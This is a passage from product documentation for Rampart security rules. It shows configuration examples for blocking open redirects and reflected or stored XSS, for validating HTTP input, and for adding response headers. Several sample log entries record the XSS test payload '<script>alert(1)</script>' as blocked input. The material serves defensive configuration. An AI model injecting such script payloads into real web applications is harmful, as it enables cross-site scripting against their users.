• `open-redirect(hosts: ["www.example.com", "www.example.net"])`
When the rule is defined for a single host name, the following alternative syntax is allowed:
• `open-redirect(hosts: "www.example.com")` |

## Then (Action)

| Action | Description |
| ------ | ----------- |
| protect | Malicious open redirect operations are blocked and an HTTP error code 403 is returned to the browser. If configured, a log message is generated with details of the event. |
| detect | Monitoring mode: the application behaves as normal. Malicious open redirect operations are allowed and no HTTP error is returned to the browser. If configured, a log message is generated with details of the event. A log message must be specified with this action. |
| allow | Open redirect operation to the specified host is allowed. |

As part of the action statement, the user may optionally specify the parameter `stacktrace: “full”`. When this parameter is specified, the stacktrace of the location of the attempted exploit is included in the security log entry.

## Examples

The following Rampart `http` rule switches on the Open Redirect security feature to protect against unauthorized redirects that originate from an HTTP/HTTPS request. The `input` declaration is omitted therefore a default of `http` is used:

```
app("Open Redirect mod"):
requires(version: Rampart/2.10)

http("Protect against open redirect attacks"):
open-redirect()
response()
protect(message: "Protect external redirects.", severity: Very-High)
endhttp

endapp
```

### Logging

When the above Rampart `http` rule is triggered a log entry similar to the following is generated:

```
<9>1 2021-03-29T09:49:34.438+01:00 userX_system java 8189 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect against open redirect attacks|Execute Rule|Very-High|rt=Mar 29 2021 09:49:34.437 +0100 dvchost=userX_system procid=8189 appVersion=1 ruleType=http securityFeature=http open redirect act=protect msg=Protect external redirects. redirectLocation=http://www.waratek.com localIpAddress=0:0:0:0:0:0:0:1 localName=ip6-localhost serverName=localhost httpSessionId=5D7CE07F605C3A6ABCFDB35D065A95E5 taintSource=HTTP_SERVLET httpRequestUri=/spiracle/SendRedirect httpRequestMethod=GET internalHttpRequestUri=/spiracle/SendRedirect httpCookies=JSESSIONID\=5D7CE07F605C3A6ABCFDB35D065A95E5 remoteIpAddress=0:0:0:0:0:0:0:1
```

## Further Examples

The following mod is the same as the previous example, with the stacktrace also logged:

```
app("Open Redirect mod - with stacktrace"):
requires(version: Rampart/2.10)

http("Protect against open redirect attacks"):
open-redirect()
response()
protect(message: "Protect external redirects.", severity: Very-High, stacktrace: "full")
endhttp

endapp
```

### Logging

When the above Rampart `http` rule is triggered a log entry similar to the following is generated:

```
<9>1 2021-03-29T09:57:10.760+01:00 userX_system java 8189 - - CEF:0|Rampart:Rampart|Rampart|2.10|Protect against open redirect attacks|Execute Rule|Very-High|rt=Mar 29 2021 09:57:10.759 +0100 dvchost=userX_system procid=8189 appVersion=1 ruleType=http securityFeature=http open redirect act=protect msg=Protect external redirects. stacktrace=com.waratek.spiracle.misc.SendRedirect.executeRequest(SendRedirect.java:36)\ncom.waratek.spiracle.misc.SendRedirect.executeRequest(SendRedirect.java:28)\ncom.waratek.spiracle.misc.SendRedirect.doGet(SendRedirect.java:20)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:624)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:731)\nsun.reflect.GeneratedMethodAccessor39.invoke(Unknown Source)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)\norg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)\norg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)\norg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\norg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)\norg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:956)\norg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\norg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:442)\norg.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1082)\norg.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:623)\norg.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:316)\njava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\njava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\norg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\njava.lang.Thread.run(Thread.java:748) redirectLocation=http://www.waratek.com localIpAddress=0:0:0:0:0:0:0:1 localName=ip6-localhost serverName=localhost httpSessionId=5D7CE07F605C3A6ABCFDB35D065A95E5 taintSource=HTTP_SERVLET httpRequestUri=/spiracle/SendRedirect httpRequestMethod=GET internalHttpRequestUri=/spiracle/SendRedirect httpCookies=JSESSIONID\=5D7CE07F605C3A6ABCFDB35D065A95E5 remoteIpAddress=0:0:0:0:0:0:0:1
```

This is a mod that disallows redirects except to a single host name, which is allowed:

```
app("Open Redirect mod - with Wikipedia allowed"):
    requires(version: Rampart/2.10)

    http("Protect against open redirect attacks"):
        open-redirect()
        response()
        protect(message: "Protect external redirects.", severity: Very-High)
    endhttp

    http("Allow redirect to Wikipedia"):
        open-redirect(hosts: "www.wikipedia.org")
        response()
        allow(message: "", severity: Low)
    endhttp
endapp
```

The following mod detects open redirect attacks that originate from an HTTP/HTTPS request:

```
app("Open Redirect mod 2"):
requires(version: Rampart/2.10)

http("Detect malicious open redirect attacks"):
input(http)
response()
open-redirect()
detect(message: "Unauthorized external redirect detected.", severity: High)
endhttp

endapp
```

The following mod protects against open redirect attacks that originate from various untrusted sources. Logging is switched off by the omission of the log message parameter:

```
app("Open Redirect mod 3"):
requires(version: Rampart/2.10)

http("Protect against open redirect attacks"):
response()
input(deserialization, http, database)
open-redirect()
protect(severity: 10)
endhttp

endapp
```

The following mod protects against open redirect attacks that originate from a database source, providing the parent subdomain or root domain of the redirect URL is the different to the application’s domain:

```
app("Open Redirect mod 4"):
requires(version: Rampart/2.10)

http("Protect against open redirect attacks, excluding subdomains"):
response()
input(database)
open-redirect(options: {exclude: subdomains})
protect(message: "Open redirect attack blocked.", severity: Medium)
endhttp

endapp
```

## **XSS Security Feature**

## **Overview**

Cross-site Scripting (XSS) is one of the most dangerous and commonly found vulnerabilities in web applications. XSS attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites.


The XSS security feature can be used to enable protection against XSS attacks.

⚠️ Only reflected XSS and stored XSS for HTML is currently supported. It is important to state that this rule provides protection only when user input is received via an API that is enabled in the taint sources of the rule. On a small number of J9 JVMs, the application may need to be launched with the following property: `com.example.FastStringLexing=false`.

## **Given (Condition)**

The XSS security feature is enabled using the Rampart `http` rule. With this rule the user specifies the two declarations - `input` and `response`.

| input | This allows the user to specify the source of the untrusted data. The following three sources are supported:
• `http` data introduced via HTTP/HTTPS requests
• `database` data introduced via JDBC connections
• `deserialization` data introduced via Java or XML deserialization.
The rule triggers if the source of the untrusted data matches that specified in the rule. If no value is specified then a default value of `http` is used. An exception is thrown if an unsupported value is provided. |
| response | This determines the HTTP endpoints for which protection is enabled. An optional Key-Value pair can be supplied to this declaration where the key is `paths` and the value can be one of the following: (indicating specifically targeted HTTP endpoints)
• a quoted string
• a list of one or more quoted-strings
If no value is specified then protection is applied to all HTTP endpoints by default. If a string value is specified then it must:
• not be empty
• be a valid relative URI |

## When (Event)

| xss | This declaration switches on the XSS security feature and must be declared with the mandatory parameter `html`. The following options may also be specified:
• `exclude`
	◦ disable protection for any specific URIs
	◦ if this option is not specified the default value is an empty exclusion list, therefore enabling protection for all web-pages
	◦ specific URIs can be specified as a single string literal or a non-empty array of one or more string literals
	◦ the wildcard character (*) is supported to cover multiple URIs. The wildcard character can be used as:
		▪ a prefix `*/safe.jsp`
		▪ a suffix `/myApplication/*`
		▪ both a prefix and a suffix `*/safe*`
• `policy`
	◦ this allows the user to determine how conservative to configure the XSS security feature
	◦ this can be set to either:
▪ loose - enable protection for user controlled changes to the HTML response that actively exploit the application
▪ strict - enable protection for injection of untrusted data into HTML response
	◦ if the policy option is not specified the default value is set to `loose`. In this configuration, the XSS security feature supports the ability to allow certain HTML tags to be injected into an HTML document from an untrusted source. Allowed tags are generally defined as text formatting and layout elements and as such, do not alter the behaviour of an application. The full list of allowed tags is defined in the following HTML5 specification:
		▪ https://www.w3.org/TR/html5/grouping-content.html#grouping-content
		▪ https://www.w3.org/TR/html5/textlevel-semantics.html#textlevel-semantics
		▪ https://www.w3.org/TR/html5/tabular-data.html#tabular-data
A tag deemed safe can also be blocked if it contains an attribute that is deemed malicious. All JavaScript event handlers are considered dangerous. The full list of these are defined in the following section of the HTML5 specification:
		▪ https://www.w3.org/TR/html52/dom.html#global-attributes
	◦ in addition to the JavaScript handlers, the following attributes have also been deemed dangerous due to their capacity to instruct a browser to load an external resource, disable security policies or potentially load personally sensitive details:
		▪ `async`
		▪ `autocomplete`
		▪ `autoplay`
		▪ `crossorigin`
		▪ `href`
		▪ `integrity`
		▪ `src`
		▪ `srcset`
		▪ `target`
		▪ `text`
		▪ `type` |
## Then (Action)

| Action | Description |
| ------ | ----------- |
| protect | XSS attacks are blocked by the agent and the HTTP response is truncated up to the point where the XSS attack occurs. If configured, a log message is generated with details of the event. |
| detect | Monitoring mode: the application behaves as normal. XSS attacks are allowed by the agent and no change is made to the HTTP response. If configured, a log message is generated with details of the event. A log message must be specified with this action. |


As part of the action statement, the user may optionally specify the parameter `stacktrace: “full”`. When this parameter is specified, the stacktrace of the location of the attempted exploit is included in the security log entry.

## Examples

The following example shows how the user may configure the XSS security feature to enable protection for all HTTP endpoints. This rule uses the default configuration to protect against reflected XSS attacks and use a `policy` of `loose` to allow safe tags to be injected into the HTML response:

```
app("XSS Mod"):
  requires(version: Rampart/2.10)
  http("XSS"):
    response()
    xss(html)
    protect(message: "XSS attacked identified and blocked", severity: Very-High)
  endhttp
endapp
```

### Logging

A log entry similar to the following is generated when above `http` rules identify an XSS attack:

```
<9>1 2021-03-29T11:54:42.1017+01:00 userX_system java 15891 - - CEF:0|Rampart:Rampart|Rampart|2.10|XSS|Execute Rule|Very-High|rt=Mar 29 2021 11:54:42.1017 +0100 dvchost=userX_system procid=15891 appVersion=1 ruleType=http securityFeature=http html xss act=protect msg=XSS attacked identified and blocked payload=<script>alert(1)</script> httpSessionId=E654F722AAFA3BF44F0D0BD4FB91134C taintSource=HTTP_SERVLET httpRequestUri=/spiracle/xss.jsp httpRequestMethod=GET internalHttpRequestUri=/spiracle/xss.jsp httpCookies=JSESSIONID\=E654F722AAFA3BF44F0D0BD4FB91134C remoteIpAddress=0:0:0:0:0:0:0:1
```

## Further Examples

The following mod is the same as the previous example, with the stacktrace also logged:

```
app("XSS Mod - with stacktrace"):
  requires(version: Rampart/2.10)
  http("XSS"):
    response()
    xss(html)
    protect(message: "XSS attacked identified and blocked", severity: Very-High, stacktrace: "full")
  endhttp
endapp
```

### Logging

When the above Rampart `http` rule is triggered a log entry similar to the following is generated:

```
<9>1 2021-03-29T10:36:49.592+01:00 userX_system java 12043 - - CEF:0|Rampart:Rampart|Rampart|2.10|XSS|Execute Rule|Very-High|rt=Mar 29 2021 10:36:49.591 +0100 dvchost=userX_system procid=12043 appVersion=1 ruleType=http securityFeature=http html xss act=protect msg=XSS attacked identified and blocked stacktrace=org.apache.jsp.xss_jsp._jspx_meth_c_005fforEach_005f0(xss_jsp.java:305)\norg.apache.jsp.xss_jsp._jspService(xss_jsp.java:159)\norg.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:731)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439)\norg.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395)\norg.apache.jasper.servlet.JspServlet.service(JspServlet.java:339)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:731)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)\norg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)\norg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)\norg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\norg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)\norg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:956)\norg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\norg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:442)\norg.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1082)\norg.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:623)\norg.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:316)\njava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\njava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\norg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\njava.lang.Thread.run(Thread.java:748) payload=<script>alert(1)</script> httpSessionId=5D7CE07F605C3A6ABCFDB35D065A95E5 taintSource=HTTP_SERVLET httpRequestUri=/spiracle/xss.jsp httpRequestMethod=GET internalHttpRequestUri=/spiracle/xss.jsp httpCookies=JSESSIONID\=5D7CE07F605C3A6ABCFDB35D065A95E5 remoteIpAddress=0:0:0:0:0:0:0:1
```

The following mod configures XSS protection for stored XSS attacks against all HTTP endpoints. The mod applies a `strict` `policy`:

```
app("XSS Mod 2"):
  requires(version: Rampart/2.10)
  http("XSS"):
    input(database)
    response()
    xss(html, options: {policy: strict})
    protect(message: "XSS attacked identified and blocked", severity: 7)
  endhttp
endapp
```

The following mod detects XSS attacks that originate from various untrusted sources. This mod explicitly sets a `loose` `policy`:

```
app("XSS Mod 3"):
  requires(version: Rampart/2.10)
  http("XSS"):
    xss(html, options: {policy: loose})
    response()
    input(http, database, deserialization)
    protect(message: "XSS attacked identified", severity: Medium)
  endhttp
endapp
```

The following mod protects against reflected XSS attacks. Validation is applied to all HTTP endpoints, except for `/myApplication/safe.jsp`:

```
app("XSS Mod 4"):
  requires(version: Rampart/2.10)
  http("XSS"):
    response()
    xss(html, options: {exclude: ["/myApplication/safe.jsp"]})
    input(http)
    protect(message: "XSS attacked identified and blocked", severity: 7)
  endhttp
endapp
```

The following mod detects reflected XSS attacks. This mod explicitly sets a `strict` `policy`. Validation is applied to all HTTP endpoints, except for both `/myApplication/safe.jsp` and `/myApplication/safeTwo.jsp`:

```
app("XSS Mod 5"):
  requires(version: Rampart/2.10)
  http("XSS"):
    xss(html, options:
              {policy: strict,
               exclude: ["/myApplication/safe.jsp", "/myApplication/safeTwo.jsp"]})
    response()
    detect(message: "XSS Rampart rule triggered", severity: Very-High)
  endhttp
endapp
```

The following mod protects against reflected XSS attacks. Protection is applied to all HTTP endpoints, except for those ending with `/safe.jsp`:

```
app("XSS Mod 6"):
  requires(version: Rampart/2.10)
  http("XSS"):
    response()
    xss(html, options: {exclude: ["*/safe.jsp"]})
    input(http)
    protect(message: "XSS attacked identified and blocked", severity: 7)
  endhttp
endapp
```

## **Improper Input Validation Security Feature**

## **Overview**

HTTP input validation is performed to ensure only properly formed data enters the workflow in a server, preventing malformed data from persisting in the database and exploiting the weaknesses of various downstream components. Input validation should be completed as early as possible in the data flow, preferably as soon as the data is received from the external party.

ℹ️ Input validation vulnerabilities are covered by CWE-20.

The Input Validation security feature is enabled using the Rampart `http` rule, and can be used to ensure that various HTTP request components adhere to predefined, expected formats.

💡It is recommended that HTTP input validation is not used as the primary method of preventing attacks such as XSS and SQL Injection. However, if implemented properly, it can significantly contribute to reducing the impact of such attacks.

## **Given (Condition)**

To enable the input validation security feature using the Rampart `http` rule the user specifies the `request` declaration.

| request | This determines the HTTP endpoints for which protection is enabled. An optional Key-Value pair can be supplied to this declaration where the key is `paths` and the value can be one of the following: (indicating specifically targeted HTTP endpoints)
• a quoted string
• a list of one or more quoted-strings
• the wildcard character (*) is supported to cover multiple URIs. This can be specified as:
	◦ a prefix `*/target.jsp`
	◦ a suffix `/myApplication/*`
	◦ both a prefix and a suffix `*/target*`
• if the wildcard character is one of the characters in the path itself, it has to be escaped using the backslash character `\*`
If no value is specified then protection is applied to all HTTP endpoints by default. If a string value is specified then it must:
• not be empty
• be a valid relative URI |
## When (Event)

| validate | Two separate key-value pairs are required for this declaration to switch on input validation protection. Valid values for the first key include:
• `parameters`, `cookies`, `headers`
Valid values for the second key include:
• `is` |
| validate | headers | • The `headers` key is used to enable input validation of HTTP request headers.
• The value of the `headers` key defines the names of one or more HTTP request headers whose values must be validated.
• Empty header names are not allowed. |
| validate | parameters |
• The `parameters` key is used to enable input validation of HTTP request parameters.
• The value of the `parameters` key defines the names of one or more HTTP request parameters whose values must be validated.
• Empty parameter names are not allowed |
| validate | cookies | • The `cookies` key is used to enable input validation of HTTP request cookies.
• The value of the `cookies` key defines the names of one or more HTTP request cookies whose values must be validated.
• Empty cookie names are not allowed |
| validate | is | • The `is` key indicates the values that are permitted, or the validation rules that must be adhered to, for the given validation target.
• Possible values for the `is` key are:
	◦ `integer`
	◦ `integer-positive`
	◦ `integer-unsigned`
	◦ `alphanumeric`
	◦ `sql-no-single-quotes`
	◦ `sql-no-double-quotes`
	◦ `html-no-single-quotes`
	◦ `html-no-double-quotes`
	◦ `html-attribute-unquoted`
	◦ `html-text`
• Alternatively, the user may specify a valid regular expression (according to the platform's regular expression syntax)
• In addition, the value can be a list comprised of more than one of any of the above types |

## Then (Action)

| Action | Description |
| ------ | ----------- |
| protect | HTTP targets that fail validation are stripped from the request. If configured, a log message is generated with details of the event. |
| detect | Monitoring mode: the application behaves as normal. If configured, a log message is generated with details of the HTTP request target that fails validation. A log message must be specified with this action. |
| allow | Can be used to allow specific HTTP request targets that adhere to a particular format that is a subset of a format already covered by a Rampart `http` rule for the same target in `protect` mode. |

As part of the action statement, the user may optionally specify the parameter `stacktrace: “full”`. When this parameter is specified, the stacktrace of the location of the attempted exploit is included in the security log entry.

## Examples

The following example shows how the user may configure the HTTP Input Validation feature to validate the HTTP request parameter “number”. The mod ensures that this value is an integer and therefore does not contain any unexpected characters. Protection is enabled for the specific page “xss.jsp”:

```
app("HTTP Input Validation mod"):
  requires(version: Rampart/2.10)
  http("HTTP single parameter validation"):
    request(paths: "/spiracle/xss.jsp")
    validate(parameters: ["number"], is: [integer])
    protect(message: "number parameter was not an integer", severity: 5)
  endhttp
endapp
```

### Logging

A log entry similar to the following is generated when the above Rampart `http` rule identifies an unexpected value for the given HTTP target:

```
<12>1 2021-03-29T11:55:47.243+01:00 userX_system java 15891 - - CEF:0|Rampart:Rampart|Rampart|2.10|HTTP single parameter validation|Execute Rule|Medium|rt=Mar 29 2021 11:55:47.243 +0100 dvchost=userX_system procid=15891 appVersion=1 ruleType=http securityFeature=http input validation act=protect msg=number parameter was not an integer parameters=number validationRule=integer value=<script>alert(1)</script> httpRequestUri=/spiracle/xss.jsp httpRequestMethod=GET internalHttpRequestUri=/spiracle/xss.jsp remoteIpAddress=0:0:0:0:0:0:0:1 httpSessionId=E654F722AAFA3BF44F0D0BD4FB91134C httpCookies=JSESSIONID\=E654F722AAFA3BF44F0D0BD4FB91134C
```

## Further examples

The following mod is the same as the previous example, with the stacktrace also logged:

```
app("HTTP Input Validation mod - with stacktrace"):
  requires(version: Rampart/2.10)
  http("HTTP single parameter validation"):
    request(paths: "/spiracle/xss.jsp")
    validate(parameters: ["number"], is: [integer])
    protect(message: "number parameter was not an integer", severity: 5, stacktrace: "full")
  endhttp
endapp
```

### Logging

A log entry similar to the following is generated when the above Rampart `http` rule identifies an unexpected value for the given HTTP target:

```
<12>1 2021-03-29T11:57:06.951+01:00 userX_system java 15891 - - CEF:0|Rampart:Rampart|Rampart|2.10|HTTP single parameter validation|Execute Rule|Medium|rt=Mar 29 2021 11:57:06.951 +0100 dvchost=userX_system procid=15891 appVersion=1 ruleType=http securityFeature=http input validation act=protect msg=number parameter was not an integer stacktrace=org.apache.jsp.xss_jsp._jspService(xss_jsp.java:119)\norg.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:731)\nsun.reflect.GeneratedMethodAccessor32.invoke(Unknown Source)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439)\norg.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395)\norg.apache.jasper.servlet.JspServlet.service(JspServlet.java:339)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:731)\nsun.reflect.GeneratedMethodAccessor32.invoke(Unknown Source)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\nsun.reflect.GeneratedMethodAccessor46.invoke(Unknown Source)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\norg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)\norg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)\norg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)\norg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\norg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)\norg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:956)\norg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\norg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:442)\norg.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1082)\norg.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:623)\norg.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:316)\njava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\njava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\norg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\njava.lang.Thread.run(Thread.java:748) parameters=number validationRule=integer value=<script>alert(1)</script> httpRequestUri=/spiracle/xss.jsp httpRequestMethod=GET internalHttpRequestUri=/spiracle/xss.jsp remoteIpAddress=0:0:0:0:0:0:0:1 httpSessionId=E654F722AAFA3BF44F0D0BD4FB91134C httpCookies=JSESSIONID\=E654F722AAFA3BF44F0D0BD4FB91134C
```

The following mod ensures the HTTP request cookie named “loginId” is a positive integer. This applies to the “index.jsp” page of the application only:

```
app("HTTP Input Validation mod 2"):
  requires(version: Rampart/2.10)
  http("HTTP cookie validation"):
    request(paths: "/webapp/index.jsp")
    validate(cookies: ["loginId"], is: [integer-positive])
    protect(message: "loginId cookie was not a positive integer", severity: 5)
  endhttp
endapp
```

The following mod ensures the HTTP request parameters “firstname” and “lastname” both adhere to the given regular expression. This applies to the “index.jsp” page of the application only:

```
app("HTTP Input Validation mod 3"):
  requires(version: Rampart/2.10)
  http("HTTP multiple parameter validation"):
    request(paths: "/webapp/index.jsp")
    validate(parameters: ["firstname", "lastname"], is: ["[a-z]+"])
    protect(message: "unexpected characters found in name parameters", severity: 5)
  endhttp
endapp
```

The following mod ensures the HTTP request parameter “price” is a positive integer. This applies to all HTTP endpoints:

```
app("HTTP Input Validation mod 4"):
  requires(version: Rampart/2.10)
  http("HTTP single parameter validation for all HTTP requests"):
    request()
    validate(parameters: ["price"], is: [integer-positive])
    protect(message: "invalid value for price HTTP parameter", severity: 7)
  endhttp
endapp
```

The following mod ensures the HTTP request cookie “name” is html that does not contain either single or double quote characters. This applies to the two pages of the application “testPageA.jsp“ and “testPageB.jsp“:

```
app("HTTP Input Validation mod 5"):
  requires(version: Rampart/2.10)
  http("HTTP single cookie with multiple validation rules"):
    request(paths: ["/webapp/testPageA.jsp", "/webapp/testPageB.jsp"])
    validate(cookies: ["name"], is: [html-no-single-quotes, html-no-double-quotes])
    protect(message: "invalid value for name HTTP cookie", severity: High)
  endhttp
endapp
```

The following mod ensures the HTTP request header “someHeader” is a valid html text. This applies to all HTTP endpoints:

```
app("HTTP Input Validation mod 6"):
  requires(version: Rampart/2.10)
  http("HTTP single header validation for all HTTP requests"):
    request()
    validate(headers: ["someHeader"], is: [html-text])
    protect(message: "invalid value for someHeader HTTP request header", severity: 7)
  endhttp
endapp
```

The following mod detects occurrences of both of the HTTP request parameters “items” and “total” that contain either single or double-quote characters. This applies to all HTTP endpoints:

```
app("HTTP Input Validation mod 7"):
  requires(version: Rampart/2.10)
  http("Monitoring mode - multiple parameters with multiple validation rules"):
    request()
    validate(parameters: ["items", "total"], is: [sql-no-single-quotes, sql-no-double-quotes])
    detect(message: "Invalid value for HTTP parameter", severity: 7)
  endhttp
endapp
```

The following mod ensures the HTTP request parameter “items” is an integer. This applies to all HTTP endpoints. An empty string is given as the `message` parameter therefore a default log message is generated:

```
app("HTTP Input Validation mod 8"):
  requires(version: Rampart/2.10)
  http("HTTP single parameter validation for all HTTP requests - default log message"):
    request()
    validate(parameters: ["items"], is: [integer])
    protect(message: "", severity: 7)
  endhttp
endapp
```

The following mod ensures the HTTP request header “someHeader” does not contain any double-quote characters. This applies to all HTTP endpoints. Logging is switched off by the omission of the log message parameter:

```
app("HTTP Input Validation mod 9"):
  requires(version: Rampart/2.10)
  http("HTTP single header validation for all HTTP requests - no log message"):
    request()
    validate(headers: ["someHeader"], is: [html-no-double-quotes])
    protect(severity: 4)
  endhttp
endapp
```

The following mod ensures the HTTP request parameter “number” is an integer. This applies to all HTTP endpoints in `/myApplication`:

```
app("HTTP Input Validation mod 10"):
  requires(version: Rampart/2.10)
    http("HTTP single parameter validation for all HTTP requests in myApplication"):
    request(paths: ["/myApplication/*"])
    validate(parameters: ["number"], is: [integer])
    protect(message: "number parameter was not an integer", severity: 5)
  endhttp
endapp
```

The following mod ensures the HTTP request parameter “number” is an integer. This applies to all HTTP endpoints containing `/vulnerable`:

```
app("HTTP Input Validation mod 11"):
  requires(version: Rampart/2.10)
    http("HTTP single parameter validation for all HTTP requests that contain vulnerable"):
    request(paths: ["*/vulnerable*"])
    validate(parameters: ["number"], is: [integer])
    protect(message: "number parameter was not an integer", severity: 5)
  endhttp
endapp
```

## **HTTP/HTTPS Response Header Addition Feature**

## Overview

Some security vulnerabilities can be resolved when the HTTP/HTTPS response contains the appropriate headers. Using the Rampart `http` rule users can add custom HTTP/HTTPS Headers to the responses of web applications. For an HTTP endpoint targeted by the rule, these headers are inserted into all HTTP/HTTPS responses of Servlets, JSPs, and static resources.

The following are examples of those headers:

• X-XSS-Protection: enables the Cross-Site Scripting filter in your browser.
• X-Content-Type-Options: allows to opt-out of MIME type sniffing.
• X-Frame-Options: protects against Clickjacking attacks, also known as UI redressing.
• Strict-Transport-Security: tells browsers to enforce HTTPS protocol over HTTP.
• Access-Control-Allow-Origin: allows web servers to specify the domains that can benefit from Cross-Origin Resource Sharing (CORS) functionality.
